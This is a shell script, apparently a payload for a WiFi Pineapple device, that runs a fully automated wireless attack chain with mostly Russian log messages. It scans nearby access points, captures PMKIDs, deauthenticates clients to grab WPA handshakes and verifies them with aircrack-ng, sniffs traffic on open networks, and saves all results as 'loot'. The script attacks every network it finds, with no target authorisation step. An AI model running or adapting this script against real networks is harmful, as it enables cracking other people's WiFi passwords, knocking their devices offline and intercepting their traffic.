#!/bin/sh
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
#####################################################
# NullSec ZeroClick Payload
# Automated attack chain - scan, identify, exploit
#####################################################
# Author: NullSec Team
# Target: WiFi Pineapple Pager
# Category: Automation/APT
#####################################################

PAYLOAD_NAME="ZeroClick"
source /root/payloads/library/nullsec-lib.sh 2>/dev/null || true
source /root/payloads/library/nullsec-scanner.sh 2>/dev/null || true

# Configuration
MONITOR_INTERFACE="wlan1mon"
ATTACK_INTERFACE="wlan1"
LOOT_DIR="/root/loot/zeroclick"
LOG_FILE="$LOOT_DIR/zeroclick_$(date +%Y%m%d_%H%M%S).log"
ATTACK_MODE="${1:-auto}"  # auto, passive, aggressive

mkdir -p "$LOOT_DIR/handshakes" "$LOOT_DIR/pmkid" "$LOOT_DIR/recon"

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "[!] ZeroClick shutdown initiated..."
    killall airodump-ng aireplay-ng hcxdumptool 2>/dev/null
    airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null
    log "[*] Attack chain terminated"
    log "[*] Loot directory: $LOOT_DIR"
    exit 0
}

trap cleanup INT TERM

log "=========================================="
log "   NullSec ZeroClick v1.0"
log "   Автоматическая цепь атак"
log "=========================================="
log "[*] Режим работы: $ATTACK_MODE"

# Phase 1: Recon
log ""
log "[ФАЗА 1] Разведка"
log "=========================================="

airmon-ng start wlan1 2>/dev/null
sleep 2

log "[*] Сканирование целей (30 секунд)..."
timeout 30 airodump-ng "$MONITOR_INTERFACE" --write "$LOOT_DIR/recon/scan" --output-format csv 2>/dev/null
sleep 2

# Parse results
if [ -f "$LOOT_DIR/recon/scan-01.csv" ]; then
    # Get APs with clients (high value targets)
    TARGETS=$(grep -E "^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "$LOOT_DIR/recon/scan-01.csv" 2>/dev/null | head -10)
    TARGET_COUNT=$(echo "$TARGETS" | grep -c ":")
    log "[+] Найдено $TARGET_COUNT потенциальных целей"
else
    log "[!] Нет результатов сканирования, повторяю..."
    exit 1
fi

# Фаза 2: Анализ целей
log ""
log "[ФАЗА 2] Анализ целей"
log "=========================================="

echo "$TARGETS" | while IFS=',' read -r BSSID FIRST_SEEN LAST_SEEN CHANNEL SPEED PRIVACY CIPHER AUTH POWER BEACONS IV LANIP IDLEN ESSID KEY; do
    BSSID=$(echo "$BSSID" | tr -d ' ')
    CHANNEL=$(echo "$CHANNEL" | tr -d ' ')
    ESSID=$(echo "$ESSID" | tr -d ' ')
    PRIVACY=$(echo "$PRIVACY" | tr -d ' ')
    POWER=$(echo "$POWER" | tr -d ' ')
    
    [ -z "$BSSID" ] && continue
    [ "$BSSID" = "BSSID" ] && continue
    
    log "[*] Анализирую: $ESSID ($BSSID)"
    log "    Канал: $CHANNEL | Безопасность: $PRIVACY | Сигнал: ${POWER}dBm"
    
    # Определение вектора атаки
    case "$PRIVACY" in
        *WPA2*|*WPA*)
            log "    [>] Вектор атаки: PMKID + захват handshake"
            ATTACK_TYPE="wpa"
            ;;
        *WEP*)
            log "    [>] Вектор атаки: Взлом WEP (устаревший)"
            ATTACK_TYPE="wep"
            ;;
        *OPN*|*OPEN*)
            log "    [>] Вектор атаки: Перехват трафика"
            ATTACK_TYPE="open"
            ;;
        *)
            log "    [>] Неизвестная безопасность, пропускаю"
            continue
            ;;
    esac
    
    # Фаза 3: Автоматическая атака
    if [ "$ATTACK_MODE" != "passive" ]; then
        log ""
        log "[ФАЗА 3] Атака: $ESSID"
        log "=========================================="
        
        # Установка канала
        iwconfig "$MONITOR_INTERFACE" channel "$CHANNEL" 2>/dev/null
        
        if [ "$ATTACK_TYPE" = "wpa" ]; then
            # Попытка захвата PMKID (без клиента)
            log "[*] Попытка захвата PMKID..."
            timeout 20 hcxdumptool -i "$MONITOR_INTERFACE" -o "$LOOT_DIR/pmkid/${ESSID}_pmkid.pcapng" --filtermode=2 --filterlist_ap="$BSSID" 2>/dev/null
            
            if [ -f "$LOOT_DIR/pmkid/${ESSID}_pmkid.pcapng" ]; then
                log "[+] Попытка захвата PMKID завершена"
            fi
            
            # Деаутентификация для handshake
            if [ "$ATTACK_MODE" = "aggressive" ]; then
                log "[*] Отправляю деаут для захвата handshake..."
                airodump-ng "$MONITOR_INTERFACE" -c "$CHANNEL" --bssid "$BSSID" --write "$LOOT_DIR/handshakes/$ESSID" --output-format pcap 2>/dev/null &
                DUMP_PID=$!
                sleep 3
                
                aireplay-ng -0 5 -a "$BSSID" "$MONITOR_INTERFACE" 2>/dev/null
                sleep 10
                
                kill $DUMP_PID 2>/dev/null
                
                # Проверка handshake
                if aircrack-ng "$LOOT_DIR/handshakes/${ESSID}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
                    log "[+] HANDSHAKE ПЕРЕХВАЧЕН для $ESSID!"
                    echo "$BSSID,$ESSID,$CHANNEL,$(date)" >> "$LOOT_DIR/captured_handshakes.csv"
                fi
            fi
            
        elif [ "$ATTACK_TYPE" = "open" ]; then
            log "[*] Перехват трафика из открытой сети..."
            timeout 30 tcpdump -i "$MONITOR_INTERFACE" -w "$LOOT_DIR/recon/${ESSID}_traffic.pcap" 2>/dev/null
        fi
    fi
    
done

# Фаза 4: Отчет
log ""
log "[ФАЗА 4] Итоги атаки"
log "=========================================="
log "[*] Отсканировано целей: $TARGET_COUNT"
log "[*] Захвачено PMKID: $(ls -1 $LOOT_DIR/pmkid/*.pcapng 2>/dev/null | wc -l)"
log "[*] Handshakes: $(ls -1 $LOOT_DIR/handshakes/*.cap 2>/dev/null | wc -l)"
log "[*] Захвачено трафика: $(ls -1 $LOOT_DIR/recon/*.pcap 2>/dev/null | wc -l)"
log ""
log "[+] Цепь атак ZeroClick завершена"
log "[*] Весь трофей сохранён в: $LOOT_DIR"

cleanup
